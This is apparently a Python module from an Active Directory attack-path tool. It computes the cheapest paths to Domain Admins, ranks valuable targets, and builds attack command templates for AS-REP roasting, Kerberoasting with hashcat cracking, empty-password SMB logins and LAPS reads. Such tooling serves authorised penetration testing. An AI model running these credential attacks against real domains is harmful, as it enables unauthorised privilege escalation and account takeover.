"""Path computation: dijkstra primary, shortest_simple_paths fallback."""

from itertools import islice
import networkx as nx

_STRUCTURAL = {"MemberOf", "Contains"}


def _exploit_fingerprint(result: "PathResult") -> tuple:
    """Tuple of (src, rel, dst) for non-structural edges only."""
    return tuple(
        (e["src"], e["relation"], e["dst"])
        for e in result.edges
        if e["relation"] not in _STRUCTURAL
    )


class PathResult:
    def __init__(self, nodes: list[str], edges: list[dict], weight: int):
        self.nodes = nodes
        self.edges = edges          # [{"src", "dst", "relation", "weight"}, ...]
        self.total_weight = weight
        self.hops = len(nodes) - 1

    def __repr__(self) -> str:
        return f"PathResult(hops={self.hops}, weight={self.total_weight})"


def _path_to_result(G: nx.DiGraph, path: list[str]) -> PathResult:
    edges = []
    total = 0
    for i in range(len(path) - 1):
        src, dst = path[i], path[i + 1]
        data = G[src][dst]
        w = data.get("weight", 5)
        total += w
        edges.append({
            "src": src,
            "dst": dst,
            "relation": data.get("relation", "Unknown"),
            "weight": w,
        })
    return PathResult(nodes=path, edges=edges, weight=total)


def find_paths(
    G: nx.DiGraph,
    source: str,
    target: str,
    k: int = 3,
) -> list[PathResult]:
    """Find up to *k* lowest-resistance paths. Returns [] if none exist."""
    if source not in G:
        raise ValueError(f"Source node not in graph: {source}")
    if target not in G:
        raise ValueError(f"Target node not in graph: {target}")

    results: list[PathResult] = []

    if k == 1:
        try:
            path = nx.dijkstra_path(G, source, target, weight="weight")
            results.append(_path_to_result(G, path))
        except (nx.NetworkXNoPath, nx.NodeNotFound):
            pass
        return results

    try:
        gen = nx.shortest_simple_paths(G, source, target, weight="weight")
        seen_fps: set[tuple] = set()
        for path in islice(gen, k * 10):
            r = _path_to_result(G, path)
            fp = _exploit_fingerprint(r)
            if fp not in seen_fps:
                seen_fps.add(fp)
                results.append(r)
            if len(results) >= k:
                break
    except (nx.NetworkXNoPath, nx.NodeNotFound):
        pass

    return results


_HIGH_VALUE_NAME_HINTS = (
    "domain admins", "enterprise admins", "schema admins", "administrators",
    "domain controllers", "account operators", "backup operators",
    "server operators", "print operators", "key admins", "enterprise key admins",
    "exchange windows permissions", "exchange trusted subsystem",
    "organization management", "dnsadmins",
)


def _node_value_score(G: nx.DiGraph, nid: str) -> int:
    """Score how interesting a node is as a fallback target.

    Higher = more interesting. Used to rank reachable-but-not-DA targets.
    """
    if nid not in G:
        return 0
    score = 0
    props = G.nodes[nid].get("props", {})
    name = G.nodes[nid].get("name", nid).lower()
    kind = G.nodes[nid].get("kind", "")

    if props.get("highvalue") or props.get("HighValue"):
        score += 50
    if props.get("admincount"):
        score += 20
    for hint in _HIGH_VALUE_NAME_HINTS:
        if hint in name:
            score += 30
            break
    if kind == "computers":
        score += 5
        # DC?
        for _, dst in G.out_edges(nid):
            if "domain controllers" in G.nodes[dst].get("name", "").lower() and G[nid][dst].get("relation") == "MemberOf":
                score += 60
                break
    if kind == "domains":
        score += 40
    if props.get("unconstraineddelegation"):
        score += 25
    if props.get("hasspn"):
        score += 5
    if props.get("dontreqpreauth"):
        score += 5
    # Penalize structural sinks
    if kind in ("ous", "containers"):
        score -= 10
    return score


def find_intermediate_targets(
    G: nx.DiGraph,
    source: str,
    excluded: set[str] | None = None,
    top_n: int = 10,
    max_hops: int = 6,
) -> list[dict]:
    """List valuable nodes reachable from source via the graph.

    Returns [{node, score, path}, ...] sorted by score desc.

    Note: if source has *any* path to the DA target (direct or multi-hop),
    `find_paths()` will surface it — Dijkstra on the full graph already
    composes long chains. This helper is for the case where source has no
    onward connectivity to DA at all (not in the DA subgraph) — then it
    surfaces the next best high-value targets the user can still pivot to,
    even if they themselves don't reach DA.
    """
    if source not in G:
        return []
    excluded = excluded or set()

    reachable: dict[str, int] = {source: 0}
    frontier = [source]
    while frontier:
        nxt = []
        for n in frontier:
            depth = reachable[n]
            if depth >= max_hops:
                continue
            for _, succ in G.out_edges(n):
                if succ in reachable:
                    continue
                reachable[succ] = depth + 1
                nxt.append(succ)
        frontier = nxt

    candidates: list[tuple[int, str]] = []
    for nid in reachable:
        if nid == source or nid in excluded:
            continue
        score = _node_value_score(G, nid)
        if score <= 0:
            continue
        candidates.append((score, nid))
    candidates.sort(key=lambda x: (-x[0], reachable[x[1]]))

    out: list[dict] = []
    for score, nid in candidates[:top_n]:
        try:
            path_nodes = nx.dijkstra_path(G, source, nid, weight="weight")
            pr = _path_to_result(G, path_nodes)
        except (nx.NetworkXNoPath, nx.NodeNotFound):
            pr = None
        out.append({"node": nid, "score": score, "path": pr})
    return out


def find_pivot_candidates(
    G: nx.DiGraph,
    target: str,
    pruned: nx.DiGraph,
    top_n: int = 15,
    excluded_sources: set[str] | None = None,
) -> list[dict]:
    """Find principals that ALREADY have a path to DA and are compromisable.

    These are the *true pivots*: out-of-band compromise of any of them
    (Kerberoast, AS-REP roast, weak/empty password, LAPS read, AdminTo from
    a host you control) hands you a node *inside* the DA subgraph — meaning
    the existing graph paths from that node to DA become exploitable.

    Returns [{
        "node": id,
        "vectors": list[str],     # how to compromise out-of-band
        "vector_commands": list[str],
        "path_to_da": PathResult | None,
        "score": int,
    }, ...] sorted by score desc.
    """
    excluded_sources = excluded_sources or set()
    out: list[dict] = []

    for nid in pruned.nodes:
        if nid == target or nid in excluded_sources:
            continue
        kind = G.nodes[nid].get("kind", "")
        if kind not in ("users", "computers"):
            continue
        p = G.nodes[nid].get("props", {})
        name = G.nodes[nid].get("name", nid)

        vectors: list[str] = []
        cmds: list[str] = []
        score = 0

        # Out-of-band attack vectors
        if kind == "users":
            short = name.split("@", 1)[0] if "@" in name else name.split(".")[0]
            d = name.rsplit("@", 1)[1] if "@" in name else "<DOMAIN>"

            if p.get("dontreqpreauth"):
                vectors.append("AS-REP roast (no creds needed)")
                cmds.extend([
                    f"impacket-GetNPUsers '{d}/' -no-pass -usersfile <(echo {short}) -dc-ip <DC_IP> -format hashcat -outputfile asrep.hash",
                    f"hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt",
                ])
                score += 30
            if p.get("hasspn") and short.lower() != "krbtgt":
                vectors.append("Kerberoast")
                cmds.extend([
                    f"impacket-GetUserSPNs '{d}/<owned_user>:<owned_pass>' -dc-ip <DC_IP> -request-user '{short}' -outputfile kerb.hash",
                    f"hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt",
                ])
                score += 25
            if p.get("passwordnotreqd"):
                vectors.append("PasswordNotRequired (try empty/weak)")
                cmds.append(f"nxc smb <DC_IP> -d {d} -u '{short}' -p '' --no-bruteforce")
                score += 20

        elif kind == "computers":
            if p.get("haslaps"):
                vectors.append("LAPS — read local admin password if you can")
                cmds.append(
                    f"impacket-GetLAPSPassword '<DOMAIN>/<owned_user>:<owned_pass>@<DC_IP>' "
                    f"-computer '{name.split('.')[0]}'"
                )
                score += 15
            if p.get("unconstraineddelegation"):
                vectors.append("Unconstrained delegation — get local admin then capture DC TGT")
                score += 25

        # Position-based score boost
        if p.get("admincount"):
            score += 10
        if p.get("highvalue") or p.get("HighValue"):
            score += 15

        if not vectors:
            continue

        try:
            path_nodes = nx.dijkstra_path(pruned, nid, target, weight="weight")
            ptd = _path_to_result(pruned, path_nodes)
        except (nx.NetworkXNoPath, nx.NodeNotFound):
            ptd = None
        if ptd is None:
            continue

        # Closer to DA = better
        score += max(0, 30 - 3 * ptd.hops)

        out.append({
            "node": nid,
            "vectors": vectors,
            "vector_commands": cmds,
            "path_to_da": ptd,
            "score": score,
        })

    out.sort(key=lambda x: -x["score"])
    return out[:top_n]


def suggest_similar_nodes(G: nx.DiGraph, query: str, top_n: int = 3) -> list[str]:
    """Return top_n node IDs most similar to *query*.

    Prefers nodes of kind 'users' since -u expects user identities.
    Falls back to all node types if not enough user matches.
    """
    try:
        from thefuzz import process as fuzz_process

        def _candidates(kind_filter: str | None) -> dict[str, str]:
            result: dict[str, str] = {}
            for nid in G.nodes:
                if kind_filter and G.nodes[nid].get("kind") != kind_filter:
                    continue
                name = G.nodes[nid].get("name", nid)
                result[name] = nid
                if nid != name:
                    result[nid] = nid
            return result

        seen: list[str] = []
        for kind in ("users", None):
            cands = _candidates(kind)
            hits = fuzz_process.extract(query, list(cands.keys()), limit=top_n * 2)
            for label, _score, *_ in hits:
                nid = cands[label]
                if nid not in seen:
                    seen.append(nid)
                if len(seen) >= top_n:
                    return seen
        return seen

    except ImportError:
        q = query.lower()
        # Prefer user nodes
        user_matches = [
            nid for nid in G.nodes
            if G.nodes[nid].get("kind") == "users" and q in nid.lower()
        ]
        if len(user_matches) >= top_n:
            return user_matches[:top_n]
        all_matches = [nid for nid in G.nodes if q in nid.lower()]
        return all_matches[:top_n]
